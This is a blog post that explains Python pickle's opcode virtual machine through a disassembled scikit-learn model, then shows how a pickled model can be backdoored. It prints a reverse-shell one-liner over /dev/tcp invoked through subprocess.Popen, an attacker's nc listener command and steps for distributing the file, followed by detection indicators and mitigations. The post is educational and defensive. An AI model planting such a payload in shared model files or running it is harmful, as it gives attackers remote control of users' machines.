---
date: "2025-03-13T00:34:08+05:30"
title: "The Dark Side of Python’s pickle – How to Backdoor an AI Model"
tags: ["ml", "python"]
draft: false
showAuthorsBadges: false
---

## Intro

Python’s `pickle` module is a popular way to save and load objects. It’s used in machine learning, data science, and web applications to store models, cache data, and transfer objects between processes.
However, pickle has a major security flaw —it can execute arbitrary code when loading data. This makes it risky, especially when handling untrusted files.

In this post, we are going to dive deep into how pickle works, all the way down to the assembly language level. We'll explore how Python objects are turned into pickle data, how that data is executed by the Python interpreter, and how malicious pickle files can be used to exploit vulnerabilities.

## How does it work ?

The Python `pickle` module implements a serialization (pickling) and deserialization (unpickling) protocol that translates arbitrary Python objectsinto a byte stream, and vice versa. The pickle module operates a separate stack-based virtual machine, distinct from CPython’s VM, processing a sequence of opcodes to reconstruct objects. Essentially, pickle functions like a mini interpreter, executing its own opcodes from a binary stream, similar to how Python’s main interpreter loop runs bytecode. However, unlike Python bytecode, which has safety checks, pickle opcodes can invoke arbitrary functions, making it inherently unsafe.

These opcodes can be categorized into several groups:

- Stack Manipulation: Control the VM's stack, managing the flow of data during serialization and deserialization.
- Data Loading: Responsible for pushing literal values and container objects onto the stack.
- Object Construction: Used to instantiate Python objects, invoking their constructors and setting their attributes.
- Function Invocation: Enable the invocation of arbitrary functions and the loading of global variables, which are critical for supporting complex object serialization.
- Memoization: Handles object references and memoization, allowing the protocol to efficiently serialize and deserialize cyclic object graphs.

The complete set of pickle opcodes is defined and implemented within the CPython source code file [`Lib/pickletools.py`](https://github.com/python/cpython/blob/3ddf983afda7173277666bb5f9033634e59363f8/Lib/pickletools.py#L1153) and opcode handling by [`Modules/_pickle.c`](https://github.com/python/cpython/blob/f3e275f1a92c0f668b1397b21e8ffaaed576c317/Modules/_pickle.c#L7924)

Pickle uses `__reduce__` or `__reduce_ex__` to customize serialization for objects, employing opcodes like GLOBAL and REDUCE. To manage object references and handle cycles, it utilizes a memo and PUT/GET opcodes, ensuring efficient reconstruction.

### Example

![Simple Code](/images/b2_simple_pickle.png)
This pickle sequence represents a simple dictionary with one key-value pair. Let’s break it down by opcode groups:

1. Protocol and Framing
   - `PROTO 4 (\x80 4)`: Specifies that this pickle uses protocol version 4.
   - `FRAME 34 (\x95 34)`: Indicates that 34 bytes are allocated for this pickle data.
2. Stack Manipulation & Data Loading
   - `EMPTY_DICT (})`: Pushes an empty dictionary {} onto the stack.
   - `MEMOIZE (\x94)`: Stores this dictionary in memory at index 0.
   - `SHORT_BINUNICODE 'title' (\x8c 'title')`: Loads the string "title" onto the stack and stores it in memory at index 1.
   - `SHORT_BINUNICODE 'Welcome to my blog!' (\x8c 'Welcome to my blog!')`: Loads the string "Welcome to my blog!" onto the stack and stores it in memory at index 2.
3. Object Construction
   - `SETITEM (s)`: Pops the key and value from the stack and inserts them into the dictionary.
4. Termination
   - `STOP (.)`: Ends deserialization.

### Example - Regression Model

Lets analyse a simple linear regression model

![Linear Model](/images/b2_model.png)

#### 1. Identifying the Stored Object

```yaml
11: \x8c SHORT_BINUNICODE 'sklearn.linear_model._base'
39: \x94 MEMOIZE    (as 0)
40: \x8c SHORT_BINUNICODE 'LinearRegression'
58: \x94 MEMOIZE    (as 1)
59: \x93 STACK_GLOBAL
60: \x94 MEMOIZE    (as 2)
```

- The pickle stream begins by storing the class path `'sklearn.linear_model._base'` and the class name `'LinearRegression'`.
- The `STACK_GLOBAL` opcode (`\x93`) constructs the `LinearRegression` class.
- At this stage, the object is not yet initialized, just referenced.

#### 2. Creating the Object

```yaml
61: )    EMPTY_TUPLE
62: \x81 NEWOBJ
63: \x94 MEMOIZE    (as 3)
64: }    EMPTY_DICT
65: \x94 MEMOIZE    (as 4)
```

- `EMPTY_TUPLE` (`\x61`): No constructor arguments (`LinearRegression()` has default parameters).
- `NEWOBJ` (`\x81`): Calls the class constructor.
- An empty dictionary (`{}`) is allocated to store the object's attributes.

#### 3. Storing Model Parameters

The pickle file then stores key attributes of the `LinearRegression` model.

##### 3.1 Model Hyperparameters

```yaml
  67: \x8c SHORT_BINUNICODE 'fit_intercept'
  82: \x94 MEMOIZE    (as 5)
  83: \x88 NEWTRUE
  84: \x8c SHORT_BINUNICODE 'normalize'
  95: \x94 MEMOIZE    (as 6)
  96: \x8c SHORT_BINUNICODE 'deprecated'
 108: \x94 MEMOIZE    (as 7)
 109: \x8c SHORT_BINUNICODE 'copy_X'
 117: \x94 MEMOIZE    (as 8)
 118: \x88 NEWTRUE
 119: \x8c SHORT_BINUNICODE 'n_jobs'
 127: \x94 MEMOIZE    (as 9)
 128: N NONE
 129: \x8c SHORT_BINUNICODE 'positive'
 139: \x94 MEMOIZE    (as 10)
 140: \x89 NEWFALSE
```

- `fit_intercept=True`
- `normalize=deprecated` (this was removed in `sklearn>=0.24`)
- `copy_X=True`
- `n_jobs=None`
- `positive=False`

##### 3.2 Number of Features

```yaml
141: \x8c SHORT_BINUNICODE 'n_features_in_'
157: \x94 MEMOIZE    (as 11)
158: K BININT1    1
```

- Stores `n_features_in_ = 1`, meaning the model was trained on a single feature.

##### 3.3 Model Coefficients (`coef_`)

```yaml
160: \x8c SHORT_BINUNICODE 'coef_'
167: \x94 MEMOIZE    (as 12)
168: \x8c SHORT_BINUNICODE 'numpy.core.multiarray'
191: \x94 MEMOIZE    (as 13)
192: \x8c SHORT_BINUNICODE '_reconstruct'
206: \x94 MEMOIZE    (as 14)
207: \x93 STACK_GLOBAL
208: \x94 MEMOIZE    (as 15)
209: \x8c SHORT_BINUNICODE 'numpy'
216: \x94 MEMOIZE    (as 16)
217: \x8c SHORT_BINUNICODE 'ndarray'
226: \x94 MEMOIZE    (as 17)
227: \x93 STACK_GLOBAL
228: \x94 MEMOIZE    (as 18)
```

- Stores the NumPy array representing `coef_`.
- The `coef_` array is reconstructed using NumPy’s `_reconstruct` method.

```bash
 233: C SHORT_BINBYTES b'b'
```

- `b'b'` represents the byte-encoded coefficient value.

##### 3.4 Singular Values & Rank (For Least Squares Solution)

```csharp
 321: \x8c SHORT_BINUNICODE 'singular_'
 332: \x94 MEMOIZE    (as 34)
```

- Stores singular values from the least squares solution.

```bash
 357: C SHORT_BINBYTES b'\xcd;\x7ff\x9e\xa0\xf6?'
```

- Stores a floating-point singular value.

##### 3.5 Model Intercept (`intercept_`)

```csharp
 371: \x8c SHORT_BINUNICODE 'intercept_'
 383: \x94 MEMOIZE    (as 41)
```

- Stores the intercept term.

```bash
 399: C SHORT_BINBYTES b'\x00\x00\x00\x00\x00\x00\xd0<'
```

- The raw byte representation of the intercept value.

#### 4. Storing Scikit-Learn Version

```java
 414: \x8c SHORT_BINUNICODE '_sklearn_version'
 432: \x94 MEMOIZE    (as 47)
 433: \x8c SHORT_BINUNICODE '1.1.3'
 440: \x94 MEMOIZE    (as 48)
```

- This records the Scikit-learn version used when the model was trained (`1.1.3`).
- This helps with compatibility checks during unpickling.

#### 5. Finalizing Object Construction

```yaml
441: u SETITEMS   (MARK at 66)
442: b BUILD
443: . STOP
```

- `SETITEMS` (`u`) assigns all the stored attributes (`coef_`, `intercept_`, `fit_intercept`, etc.) to the `LinearRegression` object.
- `BUILD` (`b`) completes the object reconstruction.
- `STOP` (`.`) signals the end of the pickle file.

## Injecting a Backdoor into an AI Model

AI models are being shared everywhere—on Hugging Face, Kaggle, and GitHub—making it easy for developers to use and improve them. Now, imagine a backdoored AI model—one that not only performs its advertised ML task but also executes a hidden reverse shell when unpickled.

### Crafting a malicious payload

![Sample payload](/images/b2_exploit.png)
This code **initiates a reverse shell** when unpickled, establishing a **TCP connection** to an attacker’s machine. This allows remote command execution on the victim’s system. If injected into an **AI model** and shared on public repositories, unsuspecting users could unknowingly **compromise their devices**.

#### How an Attacker Could Exploit This

1. Start a listener on their machine:
   ```bash
   nc -lvnp 9001
   ```
2. Distribute the malicious `.pkl` file via platforms like GitHub or Hugging Face.
3. Wait for a victim to load the model.
4. Obtain full remote access to the compromised machine.

⚠️ **Warning:** This demonstration is for **educational purposes only** and underscores the dangers of untrusted pickle files.

#### Disassembling the payload

- Look for unexpected imports (`subprocess`, `os`, `Popen`, `eval`, `exec`, `socket`, `shutil`, `ctypes`, `multiprocessing`).
- Check if `REDUCE`, `GLOBAL`, `NEWOBJ` call dangerous functions (e.g., `os.system`, `subprocess.Popen`, `eval`, `exec`).
- Watch for shell commands (`/bin/bash`, `sh`, `cmd.exe`, `powershell.exe`).
- Detect file system access (`open`, `os.remove`, `shutil.rmtree`, `os.chmod`, `os.unlink`).
- Monitor for network activity (`socket`, `requests.get`, `urllib.request.urlopen`).
- Watch for excessive memory usage (`bytearray(999999999)`, `b"\x00" * 999999999`).

For the above payload, these are the opcodes which indicate security risk

```yaml
154: \x8c SHORT_BINUNICODE 'subprocess'
167: \x8c SHORT_BINUNICODE 'Popen'
180: \x8c SHORT_BINUNICODE '/bin/bash'
192: \x8c SHORT_BINUNICODE '-c'
197: \x8c SHORT_BINUNICODE 'exec 5<>/dev/tcp/127.0.0.1/9001; cat <&5 | while read line; do $line 2>&5 >&5; done'
286: R REDUCE
```

## Mitigation - Strategy

#### Layer 1: Attack Mitigation

1. Prevent Poisoned Models & Untrusted Pickles
   - Never unpickle files from untrusted sources.
   - Use safer alternatives like **ONNX, JSON, or joblib**.
   - **Disassemble and inspect** pickle files using `pickletools.dis()`.
2. AI Firewalls & Screening Tools
3. Defensive Training Techniques
   - Distribute training across sub-models to reduce attack impact.
   - Automatic Patch Management

#### Layer 2: Model Security

1. Explainable AI (XAI) & Continuous Validation
   - Improve model transparency to **detect security weaknesses early**.
   - Conduct **continuous testing** to monitor evolving vulnerabilities.
2. Restrict Arbitrary Code Execution
   - Disable `__reduce__` and other serialization-related functions in untrusted models.
   - Use **sandboxing techniques** to execute models in **isolated environments** (Docker, VMs).

#### Layer 3: Infrastructure Security

1. Access Control & Isolation

   - Policy-Based Access Control (PBAC): Restrict unauthorized access at scale.
   - Network Segmentation\*\*: Prevent attackers from escalating privileges across systems.

2. Monitoring & Response
   - Security Orchestration, Automation, and Response (SOAR): Automate real-time threat detection.
   - AI Observability & Logging: Continuously monitor for anomalous behavior in model execution.

As AI adoption accelerates, so do adversarial attacks targeting the ML supply chain. We must be prepared for these supply chain attacks and rethink how we store, share, and deploy machine learning models to ensure the security and integrity of our AI system

---

[1] https://granica.ai/blog/ai-security-concerns-grc
